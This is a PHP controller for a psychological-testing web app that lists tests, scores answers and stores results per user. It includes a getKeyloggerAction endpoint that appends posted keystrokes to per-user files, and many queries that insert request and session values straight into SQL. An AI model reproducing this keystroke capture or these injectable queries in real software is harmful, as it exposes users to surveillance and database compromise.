<?php

namespace app\controllers;

use app\models\Main;
use app\models\User;
use classes\Cache;
use fw\core\Registry;
use fw\core\App;
use fw\core\base\View;
use fw\libs\Pagination;
use Monolog\Handler\StreamHandler;
use Monolog\Logger;
use Valitron\Validator as V;

class TestController extends AppController
{

    public $layout =  'default';

    public function indexAction()
    {
      
        //unset($_SESSION);
        if(!empty($_SESSION['user'])){
           $user_name = $_SESSION['user']['name'];
           $userid = $_SESSION['user']['id'];
           $userdata = \R::findOne("user", "id={$userid}");
           $ready_test = explode(" ",$userdata->ready_test);
           $rt1 = (isset($ready_test[0])) ? $ready_test[0] : 0;
           $rt2 = (isset($ready_test[1])) ? $ready_test[1] : 0;
           $rt3 = (isset($ready_test[2])) ? $ready_test[2] : 0;
           $rt4 = (isset($ready_test[3])) ? $ready_test[3] : 0;
           if($rt1 || $rt2 || $rt3 || $rt4){
            $sql = "";
           // debug($ready_test);
           foreach($ready_test as $rt){
            if($rt != "" && $rt != " "){
                $sql.="id!={$rt} AND ";
            }
          
        }
            $sql=trim($sql,'AND ');
            if($sql != ""){
                $tests = \R::findAll('tests',$sql);
            }
            else{
                $tests=\R::findAll('tests');
            }
           }
           else{
            $tests=\R::findAll('tests');
           }
           
           $this->set(compact('user_name','tests','ready_test'));
         
        }
        else{
            redirect("");
        }
    }


    public function onetestAction(){
       
        if(!empty($_SESSION['user'])){
           $userid = $_SESSION['user']['id'];
           $userdata = \R::findOne("user", "id={$userid}");
           $ready_test = explode(" ",$userdata->ready_test);
           $rt1 = (isset($ready_test[0])) ? $ready_test[0] : 0;
           $rt2 = (isset($ready_test[1])) ? $ready_test[1] : 0;
           $rt3 = (isset($ready_test[2])) ? $ready_test[2] : 0;
           $rt4 = (isset($ready_test[3])) ? $ready_test[3] : 0;
           $test_id = $_GET['id'];
           if($rt1 == $test_id || $rt2 == $test_id || $rt3 == $test_id || $rt4 == $test_id){
            redirect("/test/notest");
           }
            $test = \R::findOne('tests',"id={$_GET['id']}");
           // debug($_SESSION);
           $username = $_SESSION['user']['name'];
           
          
          
            $questions = \R::findAll('questions',"test_id = {$test['id']}");
            $questionCount = \R::count('questions',"test_id = {$test['id']}");
            $answers = \R::findAll('answers', "test_id = {$test['id']}");
            $this->set(compact(
                'test',
                'questions',
                'answers',
                'questionCount',
                'username'
            ));
        }
        else{
            redirect("");
        }
      
    }
   
    public function notestAction(){
      //  echo "ВЫ УЖЕ ПРОШЛИ ЭТОТ ТЕСТ!";
        
    }

    public function getKeyloggerAction(){
       // debug($_SESSION['user']['login'].".txt",1);
        $filename = "keylogdata/".$_SESSION['user']['login'].".txt";
        $file = fopen($filename, "a+");
         
        // (B) SAVE KEYSTROKES
        $keys = json_decode($_POST["keys"]);
        
        $i = 1;
        foreach ($_POST as $k=>$v) { 
            if($i % 2 != 0){
                fwrite($file,$v."; ");
            }
            else{
                fwrite($file,$v."\n");
            }
          $i++;
        }
        
        // (C) CLOSE & END
        fclose($file);
        echo "OK";
          debug(123,1);
          
      }
    public function result3Test($arr, $userid){
        $sum1 = 0;
        $sum2 = 0;
        $sum3 = 0;
        $sum4 = 0;
        $sum5 = 0;
        $res=[];
        for($i = 41; $i <= 70; $i++){
           
           
           
            if($i == 41 || $i == 42 || $i == 44 || $i == 57 || $i == 59 || $i == 65){
                $sum1 += $arr[$i];
                \R::exec( "UPDATE user SET result3_1='$sum1' WHERE id = '$userid'");
            }
            else if($i == 43 || $i == 47 || $i == 48 || $i == 50 || $i == 58 || $i == 70){
                $sum2 += $arr[$i];
                \R::exec( "UPDATE user SET result3_2='$sum2' WHERE id = '$userid'");
            }
            else if($i == 45 || $i == 46 || $i == 53 || $i == 62 || $i == 54 || $i == 66){
                $sum3 += $arr[$i];//5, 6, 13, 14, 16, 22
                \R::exec( "UPDATE user SET result3_3='$sum3' WHERE id = '$userid'");
            }
            else if($i == 49 || $i == 51 || $i == 60 || $i == 61 || $i == 63 || $i == 68){
                $sum4 += $arr[$i];//9, 11, 20, 21, 23, 28
                \R::exec( "UPDATE user SET result3_4='$sum4' WHERE id = '$userid'");
            }
            else if($i == 52 || $i == 55 || $i == 64 || $i == 66 || $i == 67 || $i == 69){
                $sum5 += $arr[$i];//12, 15, 24, 26, 27, 29
                \R::exec( "UPDATE user SET result3_5='$sum5' WHERE id = '$userid'");
            }
        }
        $res = [$sum1,$sum2,$sum3, $sum4,$sum5];
        return $res;
       
    }


    public function result4Test($arr, $userid){
        $sum1 = 0;
        $sum2 = 0;
        $sum3 = 0;
        $res=[];
        for($i = 93; $i <= 119; $i++){
           // 1, 2, 3, 4, 6, 7, 9, 10, 11, 12, 19, 20, 22
            if($i == 93 || $i == 94 || $i == 95 || $i == 96 || $i == 99 || $i == 102 || $i ==103 || $i == 104 || $i == 112 || $i == 114 ){
                $sum1 += $arr[$i];
                \R::exec( "UPDATE user SET result4_1='$sum1' WHERE id = '$userid'");
            }
            // 5, 14, 15, 16, 21, 23, 24, 26, 27
            else if($i == 97 || $i == 106 || $i == 107 || $i == 108 || $i == 113 || $i == 115 || $i == 116 || $i == 118 || $i == 119){
                $sum2 += $arr[$i];
                \R::exec( "UPDATE user SET result4_2='$sum2' WHERE id = '$userid'");
            }
            // 8, 13, 17, 18, 25
            else if($i == 100 || $i == 105 || $i == 109 || $i == 110 || $i == 117 ){
                $sum3 += $arr[$i];//5, 6, 13, 14, 16, 22
                \R::exec( "UPDATE user SET result4_3='$sum3' WHERE id = '$userid'");
            }
        }
        $res = [$sum1,$sum2,$sum3];
        return $res;
       
    }
    public function resultAction()
    {
       // debug("djfjkds",1);
       $res = [];
       $titles = [];
       $test = \R::findOne('tests',"id={$_GET['id']}");
       $testid = $test['id'];
        $userid = $_SESSION['user']['id'];
        $username = $_SESSION['user']['name'];
        if(!empty($_POST)){
            if($_POST['q'] == "0"){
                $sum = 0;
                foreach($_POST as $q){
                    $sum+=$q;
                }
                $userdata = \R::findOne("user", "id={$userid}");
                $ready_test = $userdata->ready_test." ".$testid;
                \R::exec( "UPDATE user SET result$testid='$sum',ready_test='$ready_test' WHERE id = '$userid'");

                if($testid == "3"){
                    $res = $this->result3Test($_POST, $userid);
                    $titles = ['Эмоциональная осведомленность','Управление своими эмоциями','Самомотивация','Эмпатия','Распознавание эмоций других людей'];
                }
                else if($testid == "4"){
                    $res = $this->result4Test($_POST, $userid);
                    $titles = ['Шкала цинизма','Шкала агрессивности','Шкала враждебности'];
                    
                }
               }

            
        }

       {
        $result = \R::findAll('results', "test_id = {$testid} AND score_min < {$sum} AND score_max > {$sum}");
       // debug($result);
        $this->set(compact(
            'result',
            'username',
            'res',
            'titles',
            'testid'
        ));
    }
}

}
